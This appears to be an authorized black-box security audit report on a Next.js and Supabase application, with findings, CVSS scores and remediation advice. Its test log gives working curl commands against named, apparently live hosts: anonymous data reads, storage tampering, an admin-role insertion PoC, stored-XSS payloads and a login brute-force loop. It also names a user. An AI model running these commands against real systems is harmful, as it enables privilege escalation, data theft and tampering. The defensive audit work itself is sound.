# Enterprise Security Audit Report (Detailed)

## 0. Document Control
- Report title: Enterprise Security Audit Report (Detailed)
- Target application: Next.js + Supabase application
- Frontend URL: `https://pl-conso-frontend.vercel.app/`
- Backend URL: `https://pl-conso-backend.onrender.com`
- Assessment mode: External Black-Box
- Assessment date: 2026-02-17 (UTC)
- Assessor role: Cybersecurity Auditor
- Data classification: Confidential Security Assessment

---

## 1. Executive Summary
This assessment identified multiple **critical** weaknesses in access control and policy enforcement across the frontend-exposed Supabase layer and backend action APIs.

The most severe issues were:
1. Unauthenticated backend action endpoints accepting workflow trigger requests.
2. Supabase REST policies allowing anonymous sensitive data reads.
3. Supabase storage policies allowing anonymous list/upload/download/delete.
4. Authorization integrity risk via role-table write path.

In combination, these permit an external attacker to:
- Enumerate users, roles, runs, logs, and file metadata.
- Trigger backend workflows without authentication.
- Tamper with storage objects and delete artifacts.
- Potentially manipulate authorization data.

**Overall risk rating: Critical**
**Security score: 24/100**
**Immediate action required within 24 hours**

---

## 2. Architecture Overview
Observed architecture from black-box reconnaissance:

1. Presentation tier:
- SPA frontend served by Vercel.

2. Data/auth tier:
- Supabase project (`kqszoxpiyxmohqobmfog`) providing:
  - Auth API (`/auth/v1`)
  - PostgREST (`/rest/v1`)
  - Storage API (`/storage/v1`)

3. Application service tier:
- FastAPI backend on Render with public OpenAPI docs:
  - `/docs`
  - `/openapi.json`

4. Trust boundaries:
- Internet client -> frontend host
- Internet client -> Supabase APIs
- Internet client -> backend service

Key risk observation:
- Frontend bundle disclosed Supabase project URL and publishable key (expected in client architectures), but backend and Supabase policy controls were insufficient.

---

## 3. Rules of Engagement and Constraints

1. Testing style:
- Black-box external validation.
- No source-code trust assumptions.

2. Disruption policy:
- Focused on controlled proof-of-concept behavior.
- Avoided destructive payloads beyond minimal validation where possible.

3. Authorized temporary test operations:
- Create/update/delete test-only records allowed by request.

4. Cleanup policy:
- Temporary artifacts reverted/removed when feasible.

---

## 4. Assessment Methodology (Step-by-Step)

## 4.1 Phase 1: Passive Reconnaissance
Objective:
- Confirm technology stack, discover public assets, identify API surfaces.

Actions:
1. Requested root headers and HTML.
2. Pulled main JS bundle.
3. Extracted embedded endpoints and auth/storage references.

Why this matters:
- Black-box testing relies on exposed client artifacts to map internal API topology and trust boundaries.

## 4.2 Phase 2: Surface Mapping
Objective:
- Enumerate backend and Supabase surfaces reachable from internet.

Actions:
1. Mapped Supabase project endpoint and key usage.
2. Enumerated backend endpoints from bundle references.
3. Later expanded backend endpoint map via `/openapi.json`.

## 4.3 Phase 3: Access Control and Data Exposure Validation
Objective:
- Validate confidentiality and authorization boundaries.

Actions:
1. Anonymous table reads across likely sensitive entities.
2. Anonymous write/update/delete checks.
3. Storage policy checks: list/read/write/delete.

## 4.4 Phase 4: Backend Execution and Abuse Controls
Objective:
- Validate backend auth gates, request validation, abuse resistance.

Actions:
1. Unauthenticated action endpoint calls.
2. Method tests and malformed ID tests.
3. CORS preflight checks.
4. Basic rate-limit checks.

## 4.5 Phase 5: Authenticated Validation
Objective:
- Validate role-scoped behavior and stored payload persistence with valid admin session.

Actions:
1. Acquired admin token from supplied credential.
2. Verified admin role via data layer.
3. Tested authenticated payload persistence in UI-bound fields.

## 4.6 Phase 6: SQLi Robustness (OpenAPI-Driven Fuzzing)
Objective:
- Validate SQLi resilience across all documented backend routes.

Actions:
1. Generated route list from OpenAPI.
2. Executed 182 fuzz cases with varied SQLi/path payload classes.
3. Measured response class, error leakage, and timing behavior.

## 4.7 Phase 7: Cleanup and Documentation
Objective:
- Revert test-only changes and produce enterprise documentation.

Actions:
1. Removed inserted role escalation row (PoC cleanup).
2. Reverted profile payload test values.
3. Deleted feedback payload test record.
4. Deleted storage probe object.

---

## 5. Detailed Chronological Test Log

This section summarizes each major test stage with approach, command pattern, and observed outcome.

## 5.1 Frontend baseline and hardening checks
Approach:
- Gather root response metadata and baseline security headers.

Representative commands:
```bash
curl -sSI https://pl-conso-frontend.vercel.app/
curl -sk https://pl-conso-frontend.vercel.app/ | head -n 120
curl -skI https://pl-conso-frontend.vercel.app/assets/index-PvOG8iRw.js
```

Observed:
- Host reachable, Vercel headers present, HSTS enabled.
- Missing strict CSP/frame-focused hardening headers in baseline response.

## 5.2 Bundle extraction and endpoint mining
Approach:
- Parse exposed client bundle for security-relevant indicators.

Representative commands:
```bash
curl -sk https://pl-conso-frontend.vercel.app/assets/index-PvOG8iRw.js -o /tmp/plconso.js
rg -n "supabase|createClient\(|localStorage|auth\.|pl-conso-backend\.onrender\.com" /tmp/plconso.js | head -n 250
rg -o "sb_publishable_[A-Za-z0-9_-]+" /tmp/plconso.js | head -n 5
rg -o "https://[a-z0-9-]+\.supabase\.co" /tmp/plconso.js | sort -u
```

Observed:
- Supabase project ref and publishable key exposed in bundle.
- Backend endpoint references identified.

## 5.3 Anonymous Supabase REST exposure tests
Approach:
- Test whether publishable key context can read sensitive records.

Representative commands:
```bash
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?select=*&limit=1" -H "apikey: <publishable>" -H "Authorization: Bearer <publishable>"
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?select=*&limit=3" -H "apikey: <publishable>" -H "Authorization: Bearer <publishable>"
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?select=*&limit=5" -H "apikey: <publishable>" -H "Authorization: Bearer <publishable>"
```

Observed:
- Sensitive records returned with HTTP 200 in anonymous context.

## 5.4 Anonymous write and integrity checks
Approach:
- Validate whether anonymous context can change or delete records.

Representative commands:
```bash
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs" ... --data '{}'
curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?id=eq.<id>" ...
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?id=eq.<id>" ...
```

Observed:
- Mixed behavior due to inconsistent policy enforcement.
- Some operations blocked, others accepted in dangerous paths.

## 5.5 Role escalation PoC
Approach:
- Test direct role assignment mutation in `user_roles`.

Representative commands:
```bash
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles" \
  -H "apikey: <publishable>" -H "Authorization: Bearer <publishable>" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  --data '{"user_id":"8663dc1a-8cd2-4068-9b54-c98bb2c4b905","role":"admin"}'
```

Observed:
- Insert succeeded (`201`) during test.
- Duplicate-constraint behavior also confirmed on repeat attempt.

Cleanup:
```bash
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?id=eq.<inserted_id>" ...
```

## 5.6 Storage misconfiguration validation
Approach:
- Verify anonymous list/read/write/delete in storage buckets.

Representative commands:
```bash
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/list/input-creation-output" ... --data '{"prefix":"","limit":10,"offset":0}'
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/<probe>.txt" ...
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/<probe>.txt" ...
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/<probe>.txt" ...
```

Observed:
- All tested operations succeeded in anonymous context.

## 5.7 Backend unauthenticated action validation
Approach:
- Directly call workflow action endpoints without tokens.

Representative commands:
```bash
curl -sk -X POST "https://pl-conso-backend.onrender.com/input-run/abc"
curl -sk -X POST "https://pl-conso-backend.onrender.com/pdp-run/abc"
curl -sk -X POST "https://pl-conso-backend.onrender.com/run/abc"
```

Observed:
- Action endpoints accepted unauthenticated requests in multiple paths (`200` success seen).

## 5.8 Backend discovery and OpenAPI enumeration
Approach:
- Use publicly exposed docs to enumerate exact attack surface.

Representative commands:
```bash
curl -sk https://pl-conso-backend.onrender.com/docs
curl -sk https://pl-conso-backend.onrender.com/openapi.json -o /tmp/backend_openapi.json
```

Observed:
- OpenAPI exposed full route list including run actions and delete/cancel endpoints.

## 5.9 CORS and abuse checks
Approach:
- Probe preflight behavior and baseline burst handling.

Representative commands:
```bash
curl -sk -D - -X OPTIONS "https://pl-conso-backend.onrender.com/input-run/123" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST"
for i in $(seq 1 20); do curl -sk "https://pl-conso-backend.onrender.com/run/<id>/logs"; done
```

Observed:
- Hostile-origin preflight rejected in tested case.
- No meaningful 429 throttling observed in tested bursts.

## 5.10 Auth endpoint behavior checks
Approach:
- Test brute-force signal and account states.

Representative commands:
```bash
for i in $(seq 1 20); do curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/token?grant_type=password" -H "apikey: <publishable>" -H "Content-Type: application/json" --data '{"email":"nosuchuser@example.com","password":"WrongPass123!"}'; done
```

Observed:
- Invalid login responses returned; no 429 signal in tested window.

## 5.11 Authenticated admin validation (provided credential)
Approach:
- Acquire real admin session and test authenticated data flow/security controls.

Representative commands:
```bash
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/token?grant_type=password" -H "apikey: <publishable>" -H "Content-Type: application/json" --data '{"email":"<redacted>","password":"<redacted>"}' -o /tmp/login_kunal.json
```

Token extraction and role check:
```bash
AT=$(sed -nE 's/.*"access_token":"([^"]+)".*/\1/p' /tmp/login_kunal.json)
USER_ID=$(sed -nE 's/.*"user":\{[^}]*"id":"([^"]+)".*/\1/p' /tmp/login_kunal.json)
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?user_id=eq.$USER_ID&select=role" -H "apikey: <publishable>" -H "Authorization: Bearer $AT"
```

Observed:
- Auth success (`200`) and admin role confirmed.

## 5.12 Authenticated stored-XSS persistence tests
Approach:
- Insert payload-like content in fields likely rendered in admin/user views.

Representative commands:
```bash
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback" -H "apikey: <publishable>" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data "{\"user_id\":\"$USER_ID\",\"subject\":\"XSS Auth Probe\",\"message\":\"<img src=x onerror=alert(42)>\"}"

curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.$USER_ID" -H "apikey: <publishable>" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"<svg/onload=alert(777)>"}'

curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback?select=id,user_id,subject,message,created_at&order=created_at.desc&limit=3" -H "apikey: <publishable>" -H "Authorization: Bearer $AT"
```

Observed:
- Payload strings persisted and were retrievable in authenticated data flows.

Cleanup:
```bash
curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.$USER_ID" -H "apikey: <publishable>" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"Kunal Puri"}'
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback?id=eq.<test_feedback_id>" -H "apikey: <publishable>" -H "Authorization: Bearer $AT" -H "Prefer: return=representation"
```

## 5.13 Deep SQLi fuzzing (OpenAPI-driven)
Approach:
- Use OpenAPI to avoid blind spots and fuzz all documented run-related endpoints.
- Execute broad payload classes and record response classes/timing.

Execution:
- Fuzz script generated and run.
- Result artifact retained: `/tmp/sqli_results.tsv`.

Representative result analysis commands:
```bash
awk -F"\t" 'NR>1{key=$1"\t"$4; c[key]++} END{for (k in c) print c[k],k}' /tmp/sqli_results.tsv | sort -nr
awk -F"\t" 'NR>1 && $4==403 {print $1" payload="$3}' /tmp/sqli_results.tsv | head -n 20
awk -F"\t" 'NR>1 && $4==422 {print $1" payload="$3}' /tmp/sqli_results.tsv | head -n 20
```

Observed:
- 182 route/payload combinations tested.
- No SQL stack traces or DB syntax leakage returned.
- SQL-like payloads mostly hit edge/WAF-like 403 path.
- Many malformed payloads still produce 500-class errors (hardening gap).

---

## 6. Threat Model

## 6.1 Threat actors
1. External unauthenticated attacker
2. Authenticated low-privilege user
3. Automated scraping/abuse bot
4. Insider leveraging weak policies

## 6.2 High-value assets
1. User identity and role data
2. Run configurations and logs
3. Output/input files in storage
4. Workflow execution controls

## 6.3 Primary abuse goals
1. Data exfiltration
2. Workflow disruption/abuse
3. Privilege elevation
4. Persistence via stored payloads

---

## 7. Findings (Detailed)

## F-01: Unauthenticated backend workflow execution
- Severity: Critical
- CVSS v3.1: 9.8
- Affected:
  - `POST /run/{run_id}`
  - `POST /input-run/{run_id}`
  - `POST /pdp-run/{run_id}`
- Evidence:
  - Unauthenticated requests returned successful trigger responses in tested cases.
- Exploitation scenario:
  - Internet attacker repeatedly calls trigger endpoints to launch unauthorized processing.
- Business impact:
  - Cost amplification, queue abuse, operational integrity risk.
- Remediation:
  1. Require JWT auth on all action endpoints.
  2. Enforce ownership/role checks server-side.
  3. Add per-user and per-IP rate limits.

## F-02: Supabase REST sensitive data exposure (RLS failure)
- Severity: Critical
- CVSS v3.1: 9.1
- Affected tables (observed):
  - `runs`, `run_logs`, `run_files`, `profiles`, `user_roles`, `projects`
- Evidence:
  - Anonymous context returned HTTP 200 with sensitive rows.
- Exploitation scenario:
  - Attacker enumerates users/roles and internal processing metadata.
- Business impact:
  - Confidentiality breach, recon for lateral attacks.
- Remediation:
  1. Redefine RLS policies to enforce least privilege.
  2. Require `auth.uid()` and role/tenant constraints.
  3. Add automated RLS regression tests in CI.

## F-03: Supabase storage anonymous CRUD
- Severity: Critical
- CVSS v3.1: 9.8
- Affected buckets (observed):
  - `input-creation-output`
  - `input-creation-bussiness-file`
  - Others listed as queryable in tests
- Evidence:
  - Anonymous list/upload/download/delete succeeded.
- Exploitation scenario:
  - Attacker exfiltrates or replaces critical artifacts; deletes files.
- Business impact:
  - Data integrity loss, process disruption, confidentiality breach.
- Remediation:
  1. Disable public access and enforce strict storage policies.
  2. Use signed URLs for controlled read access.
  3. Monitor and alert on object write/delete anomalies.

## F-04: Authorization integrity risk via `user_roles` write path
- Severity: Critical
- CVSS v3.1: 9.8
- Evidence:
  - Admin role insertion succeeded in PoC; duplicate constraint appeared on repeat.
- Exploitation scenario:
  - Attacker inserts elevated role mapping and gains privileged access.
- Business impact:
  - Full authorization bypass potential.
- Remediation:
  1. Restrict role-table writes to trusted backend service role only.
  2. Add DB constraints + policy guards for role mutation workflow.
  3. Audit and reconcile existing role records immediately.

## F-05: Stored XSS payload persistence in authenticated data flows
- Severity: High
- CVSS v3.1: 8.0
- Evidence:
  - Payloads persisted in `feedback.message` and `profiles.full_name`.
- Important nuance:
  - Data-layer persistence does not always equal execution.
  - Execution depends on downstream unsafe rendering.
- Exploitation scenario:
  - Attacker stores malicious payload; privileged user views unsafe sink.
- Remediation:
  1. Enforce output encoding in all render paths.
  2. Ban unsafe HTML renderers without sanitizer.
  3. Add strict CSP and sink-level tests.

## F-06: Rate-limiting weakness signals
- Severity: Medium
- CVSS v3.1: 6.5
- Evidence:
  - Burst attempts did not yield meaningful 429 responses in tested windows.
- Exploitation scenario:
  - Brute-force or scraping amplification.
- Remediation:
  1. Apply endpoint-specific throttling.
  2. Add adaptive controls (captcha/step-up) for auth endpoints.

## F-07: Security header hardening gaps
- Severity: Medium
- CVSS v3.1: 6.1
- Evidence:
  - Baseline response lacked strong CSP/frame policy hardening.
- Remediation:
  1. Add CSP (`default-src`, `script-src`, `frame-ancestors`).
  2. Add explicit clickjacking and referrer controls.

## F-08: Input-validation and error-handling weakness
- Severity: Medium
- CVSS v3.1: 5.9
- Evidence:
  - Numerous malformed payloads returned generic 500 responses.
- Risk:
  - Reliability degradation and potential hidden exploitability.
- Remediation:
  1. Central request validation middleware.
  2. Structured error handling, no generic exception exposure.

---

## 8. Risk Classification (CVSS Style)

| ID | Title | Severity | CVSS |
|---|---|---|---|
| F-01 | Unauthenticated backend workflow execution | Critical | 9.8 |
| F-02 | Supabase REST sensitive data exposure | Critical | 9.1 |
| F-03 | Supabase storage anonymous CRUD | Critical | 9.8 |
| F-04 | Role-table authorization integrity failure | Critical | 9.8 |
| F-05 | Stored payload persistence (XSS risk chain) | High | 8.0 |
| F-06 | Rate-limiting weaknesses | Medium | 6.5 |
| F-07 | Security header hardening gaps | Medium | 6.1 |
| F-08 | Input validation and 500 error handling gaps | Medium | 5.9 |

---

## 9. Exploitation Scenarios (Detailed)

1. Anonymous workflow abuse:
- Attacker automates POST requests to run-trigger endpoints.
- Effect: unauthorized jobs + platform cost/availability impact.

2. Data reconnaissance and extraction:
- Attacker harvests `profiles`, `user_roles`, run metadata, logs.
- Effect: identity mapping and operational intelligence leakage.

3. Storage tampering campaign:
- Attacker uploads malicious replacements or deletes production artifacts.
- Effect: output corruption and business process failures.

4. Role escalation and persistence:
- Attacker writes elevated role mapping.
- Effect: persistent admin-level access path.

5. Stored payload social execution:
- Malicious payload stored in profile/feedback.
- Effect: possible execution in privileged UI contexts if unsafe sinks exist.

---

## 10. Remediation Roadmap

## 10.1 Immediate (0–24h)
1. Require JWT auth on all backend mutating endpoints.
2. Lock all sensitive Supabase tables with strict RLS.
3. Lock storage buckets and remove anonymous write/delete.
4. Disable direct role-table mutation from client contexts.
5. Rotate keys/tokens where exposure is plausible.

## 10.2 Near-term (1–7 days)
1. Implement strict ID and schema validation across backend routes.
2. Replace generic 500 patterns with deterministic validation errors.
3. Add WAF rules for abuse classes and endpoint-level throttling.
4. Instrument structured security audit logs and alerts.

## 10.3 Medium-term (7–30 days)
1. Add CSP + frame protections + referrer policy.
2. Add secure rendering standards for all user-controlled fields.
3. Add automated security regression suite:
- RLS unit tests
- storage policy tests
- endpoint auth tests
- abuse/rate-limit tests

## 10.4 Verification checklist after fixes
1. Anonymous REST reads on sensitive tables -> denied.
2. Anonymous storage upload/delete -> denied.
3. Backend action endpoints without JWT -> denied.
4. Role-table direct client writes -> denied.
5. Malformed payloads return controlled 4xx, not generic 500.
6. XSS payloads sanitized/encoded in all UI views.

---

## 11. Security Score (0–100)
- Final score: **24 / 100**

Scoring rationale:
1. Critical control failures in authz/policy layers.
2. High exploitability with low attacker complexity.
3. Multiple pathways to confidentiality, integrity, and availability impact.

---

## 12. Compliance Recommendations

## 12.1 SOC 2 (Security/Availability)
1. Formal least-privilege access model for data and storage.
2. Change-management controls for policies and role assignments.
3. Continuous monitoring and incident detection for privileged operations.

## 12.2 ISO 27001 / 27002
1. Strengthen access control controls (A.9-like domains).
2. Harden secure operations and logging controls.
3. Enforce secure development and policy testing gates.

## 12.3 OWASP ASVS / Top 10 alignment
1. Prioritize A01 (Broken Access Control).
2. Address A05 (Security Misconfiguration).
3. Address A07 (Identification and Authentication Failures).

## 12.4 Data protection posture
1. Minimize exposure of identity and role metadata in APIs.
2. Enforce purpose-limited access with auditable policy controls.

---

## 13. Test Data Hygiene and Cleanup Ledger

Cleanup actions completed:
1. Removed temporary role escalation row inserted during PoC.
2. Reverted profile name payload values to original.
3. Deleted inserted feedback XSS test record.
4. Deleted storage probe object.

Residual caution:
- Verify no additional derived artifacts were generated by backend jobs triggered during unauthenticated endpoint validation.

---

## 14. Limitations and Assumptions

1. Browser automation was not used in this environment; stored-XSS was validated to persistence/retrieval stage, not visual popup execution.
2. Findings are based on externally reachable surfaces and observed policy behavior at test time.
3. Some edge/WAF behavior may vary by geography/IP reputation.

---

## 15. Evidence and Companion Artifacts

Primary local artifacts:
1. `SECURITY_AUDIT_DETAILED_REPORT.md` (this report)
2. `SECURITY_AUDIT_COMMAND_TRACE.md` (command-by-command trace)
3. `/tmp/sqli_results.tsv` (fuzz result matrix)
4. `/tmp/backend_openapi.json` (backend route inventory)

---

## 16. Final Statement
The assessment confirms enterprise-critical security weaknesses concentrated in authorization and policy governance. Immediate containment is required, followed by structured hardening and automated verification to prevent recurrence.

